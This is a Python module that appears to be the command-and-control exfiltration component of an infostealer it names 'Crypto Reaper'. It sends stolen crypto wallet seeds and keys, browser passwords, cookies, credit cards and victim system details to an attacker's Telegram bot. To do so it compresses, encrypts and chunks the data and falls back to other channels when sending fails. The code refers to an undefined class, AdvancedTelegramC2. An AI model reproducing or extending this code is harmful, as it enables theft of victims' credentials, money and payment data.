import aiohttp
import asyncio
import json
import os
import time
import random
import hashlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import zlib
import asyncio
from urllib.parse import quote

class TelegramC2:
    def __init__(self):
        self.session_timeout = aiohttp.ClientTimeout(total=60)
        self.retry_attempts = 3
        self.retry_delay = 5
        self.chunk_size = 3500  
        self.encryption_key = None
        
    def generate_encryption_key(self, bot_token):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'crypto_reaper_salt',
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(bot_token.encode()))
        return key
    
    async def send_to_telegram(self, data, bot_token, chat_id, max_retries=None):
        if max_retries is None:
            max_retries = self.retry_attempts
            
        self.encryption_key = self.generate_encryption_key(bot_token)
        
        for attempt in range(max_retries):
            try:
                success = await self._send_compressed_messages(data, bot_token, chat_id)
                if success:
                    return True
                success = await self._send_as_encrypted_document(data, bot_token, chat_id)
                if success:
                    return True
                success = await self._send_split_messages(data, bot_token, chat_id)
                if success:
                    return True
                    
            except Exception as e:
                print(f"Telegram attempt {attempt + 1} failed: {e}")
                
            if attempt < max_retries - 1:
                await asyncio.sleep(self.retry_delay * (2 ** attempt))  
        return await self._try_alternative_endpoints(data, bot_token, chat_id)
    
    async def _send_compressed_messages(self, data, bot_token, chat_id):
        try:
            formatted_data = self._format_data_advanced(data)
            compressed_data = zlib.compress(json.dumps(formatted_data).encode(), level=9)
            encrypted_data = self._encrypt_data(compressed_data)
            base64_data = base64.b64encode(encrypted_data).decode()
            chunks = [base64_data[i:i+self.chunk_size] for i in range(0, len(base64_data), self.chunk_size)]
            
            async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
                init_payload = {
                    "chat_id": chat_id,
                    "text": f"🚨 CRYPTO_DATA_START 🚨\nChunks: {len(chunks)}\nSize: {len(compressed_data)}",
                    "parse_mode": "HTML"
                }
                await self._make_telegram_request(session, bot_token, "sendMessage", init_payload)
                for i, chunk in enumerate(chunks):
                    chunk_payload = {
                        "chat_id": chat_id,
                        "text": f"<code>CHUNK_{i:03d}:{chunk}</code>",
                        "parse_mode": "HTML"
                    }
                    success = await self._make_telegram_request(session, bot_token, "sendMessage", chunk_payload)
                    if not success:
                        return False
                end_payload = {
                    "chat_id": chat_id,
                    "text": "✅ CRYPTO_DATA_END ✅",
                    "parse_mode": "HTML"
                }
                await self._make_telegram_request(session, bot_token, "sendMessage", end_payload)
                
            return True
            
        except Exception as e:
            print(f"Compressed message sending failed: {e}")
            return False
    
    async def _send_as_encrypted_document(self, data, bot_token, chat_id):
        try:
            import tempfile
            with tempfile.NamedTemporaryFile(delete=False, suffix='.bin') as f:
                full_data = {
                    "metadata": {
                        "timestamp": time.time(),
                        "build_id": hashlib.md5(bot_token.encode()).hexdigest()[:8],
                        "data_hash": hashlib.sha256(json.dumps(data).encode()).hexdigest()
                    },
                    "payload": data
                }
                
                compressed = zlib.compress(json.dumps(full_data).encode(), level=9)
                encrypted = self._encrypt_data(compressed)
                f.write(encrypted)
                temp_path = f.name
            
            async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
                info_payload = {
                    "chat_id": chat_id,
                    "text": f"📦 Encrypted Data Package\nSize: {len(encrypted)} bytes\nHash: {hashlib.sha256(encrypted).hexdigest()[:16]}",
                    "parse_mode": "HTML"
                }
                await self._make_telegram_request(session, bot_token, "sendMessage", info_payload)
                with open(temp_path, 'rb') as file:
                    form_data = aiohttp.FormData()
                    form_data.add_field('chat_id', chat_id)
                    form_data.add_field('document', file, filename=f'data_{int(time.time())}.bin')
                    form_data.add_field('caption', '🔒 Encrypted data package - Use key from bot token')
                    
                    success = await self._make_telegram_request(session, bot_token, "sendDocument", form_data=form_data)
                
                os.unlink(temp_path)
                return success
                
        except Exception as e:
            print(f"Document upload failed: {e}")
            if 'temp_path' in locals() and os.path.exists(temp_path):
                os.unlink(temp_path)
            return False
    
    async def _send_split_messages(self, data, bot_token, chat_id):
        try:
            formatted_data = self._format_data_advanced(data)
            data_str = json.dumps(formatted_data, indent=2, ensure_ascii=False)
            chunks = [data_str[i:i+self.chunk_size] for i in range(0, len(data_str), self.chunk_size)]
            
            async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
                for i, chunk in enumerate(chunks):
                    payload = {
                        "chat_id": chat_id,
                        "text": f"```\n{chunk}\n```",
                        "parse_mode": "MarkdownV2"
                    }
                    success = await self._make_telegram_request(session, bot_token, "sendMessage", payload)
                    if not success and i == 0:
                        return False 
                    await asyncio.sleep(0.5)  
                    
            return True
            
        except Exception as e:
            print(f"Split message sending failed: {e}")
            return False
    
    async def _try_alternative_endpoints(self, data, bot_token, chat_id):
        endpoints = [
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            f"https://api.telegram.org/bot{bot_token}/sendDocument",
        ]
        for endpoint in endpoints:
            try:
                async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
                    alert_payload = {
                        "chat_id": chat_id,
                        "text": "🚨 ALERT: Crypto data available - Check alternative channel",
                        "parse_mode": "HTML"
                    }
                    
                    success = await self._make_telegram_request(session, bot_token, "sendMessage", alert_payload, custom_endpoint=endpoint)
                    if success:
                        return True
                        
            except Exception as e:
                print(f"Alternative endpoint {endpoint} failed: {e}")
                continue
        
        return False
    
    async def _make_telegram_request(self, session, bot_token, method, payload=None, form_data=None, custom_endpoint=None):
        try:
            if custom_endpoint:
                url = custom_endpoint
            else:
                url = f"https://api.telegram.org/bot{bot_token}/{method}"
            
            if form_data:
                async with session.post(url, data=form_data) as response:
                    return response.status == 200
            else:
                async with session.post(url, json=payload) as response:
                    if response.status == 200:
                        return True
                    else:
                        error_text = await response.text()
                        print(f"Telegram API error {response.status}: {error_text}")
                        return False
                        
        except asyncio.TimeoutError:
            print(f"Telegram request timeout for {method}")
            return False
        except Exception as e:
            print(f"Telegram request failed for {method}: {e}")
            return False
    
    def _format_data_advanced(self, data):
        high_value_items = {}
        wallets_summary = {}
        total_wallets = 0
        for wallet_name, wallet_data in data.get("wallets", {}).items():
            if wallet_data:  
                wallets_summary[wallet_name] = {
                    "data_found": len(wallet_data),
                    "has_seeds": any("seed" in str(item).lower() for item in wallet_data),
                    "has_keys": any("key" in str(item).lower() for item in wallet_data)
                }
                total_wallets += 1
        browser_summary = {}
        credit_cards_found = 0
        for browser_name, browser_data in data.get("browsers", {}).items():
            if browser_data:
                browser_summary[browser_name] = {
                    "passwords": len(browser_data.get("passwords", [])),
                    "cookies": len(browser_data.get("cookies", [])),
                    "credit_cards": len(browser_data.get("credit_cards", [])),
                    "autofill": len(browser_data.get("autofill", []))
                }
                credit_cards_found += len(browser_data.get("credit_cards", []))
        system_info = data.get("system_info", {})
        
        formatted = {
            "metadata": {
                "timestamp": time.time(),
                "data_id": hashlib.sha256(str(time.time()).encode()).hexdigest()[:16],
                "priority": "HIGH" if total_wallets > 0 or credit_cards_found > 0 else "MEDIUM"
            },
            "summary": {
                "crypto_wallets_found": total_wallets,
                "credit_cards_found": credit_cards_found,
                "screenshots": len(data.get("screenshots", [])),
                "system_compromised": True if total_wallets > 0 else False
            },
            "high_value_targets": {
                "wallets": wallets_summary,
                "browsers": browser_summary
            },
            "system": {
                "hostname": system_info.get("hostname", "Unknown"),
                "username": system_info.get("username", "Unknown"),
                "os": system_info.get("os", "Unknown"),
                "ip": system_info.get("ip", "Unknown")
            },
            "full_data_available": True  
        }
        
        return formatted
    
    def _encrypt_data(self, data):
        cipher = Fernet(self.encryption_key)
        return cipher.encrypt(data)
    
    def _decrypt_data(self, encrypted_data):
        cipher = Fernet(self.encryption_key)
        return cipher.decrypt(encrypted_data)

class TelegramManager:
    
    def __init__(self):
        self.c2 = AdvancedTelegramC2()
        self.message_queue = asyncio.Queue()
        self.is_running = False
        
    async def start_async_processing(self):
        self.is_running = True
        while self.is_running:
            try:
                task = await asyncio.wait_for(self.message_queue.get(), timeout=1.0)
                if task:
                    data, bot_token, chat_id = task
                    await self.c2.send_to_telegram(data, bot_token, chat_id)
                    self.message_queue.task_done()
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                print(f"Async processing error: {e}")
    
    async def send_async(self, data, bot_token, chat_id):
        await self.message_queue.put((data, bot_token, chat_id))
    
    def stop_async_processing(self):
        self.is_running = False

_telegram_manager = TelegramManager()

async def send_to_telegram(data, bot_token, chat_id, async_mode=True):
    if async_mode:
        await _telegram_manager.send_async(data, bot_token, chat_id)
        return True
    else:
        c2 = AdvancedTelegramC2()
        return await c2.send_to_telegram(data, bot_token, chat_id)

async def initialize_telegram_system():
    asyncio.create_task(_telegram_manager.start_async_processing())

async def shutdown_telegram_system():
    _telegram_manager.stop_async_processing()
    await _telegram_manager.message_queue.join()

async def test_telegram_connection(bot_token, chat_id):
    test_data = {
        "test": True,
        "timestamp": time.time(),
        "message": "Crypto Reaper connection test successful"
    }
    
    c2 = AdvancedTelegramC2()
    return await c2.send_to_telegram(test_data, bot_token, chat_id, max_retries=1)